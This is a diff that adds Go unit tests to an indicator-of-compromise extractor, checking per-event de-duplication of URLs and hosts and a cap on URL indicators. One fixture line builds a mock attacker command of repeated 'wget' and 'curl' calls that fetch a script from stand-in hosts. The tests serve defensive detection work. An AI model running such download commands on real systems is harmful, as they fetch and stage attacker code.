@@ -557,3 +557,43 @@ func TestExtractNumericURLHosts(t *testing.T) {
 		}
 	}
 }
+
+// One event naming the same indicator several times is one sighting. URLs and
+// hosts were not de-duplicated per event the way hashes are, so repeating a
+// URL in one command inflated its sighting count without limit.
+func TestExtractDedupesPerEvent(t *testing.T) {
+	e := NewExtractor()
+	cmd := strings.Repeat("wget http://evil.example/x.sh; ", 50) + "curl http://203.0.113.9/y"
+	got := iocSet(e.Extract(makeIOCEvent("203.0.113.9", "command", cmd, nil)))
+	for k, n := range got {
+		if n != 1 {
+			t.Errorf("%s extracted %d times from one event", k, n)
+		}
+	}
+	for _, want := range []string{"url:http://evil.example/x.sh", "domain:evil.example", "ip:203.0.113.9", "url:http://203.0.113.9/y"} {
+		if got[want] == 0 {
+			t.Errorf("missing %s", want)
+		}
+	}
+}
+
+// One event cannot turn into an unbounded number of URL IOCs.
+func TestExtractCapsURLsPerEvent(t *testing.T) {
+	e := NewExtractor()
+	var b strings.Builder
+	for i := 0; i < 5000; i++ {
+		fmt.Fprintf(&b, "http://h%d.evil.example/ ", i)
+	}
+	urls, domains := 0, 0
+	for _, i := range e.Extract(makeIOCEvent("198.51.100.7", "command", b.String(), nil)) {
+		switch i.Type {
+		case IOCTypeURL:
+			urls++
+		case IOCTypeDomain:
+			domains++
+		}
+	}
+	if urls == 0 || urls > 256 || domains > 256 {
+		t.Fatalf("one event gave %d URL and %d domain IOCs, want 1..256 each", urls, domains)
+	}
+}
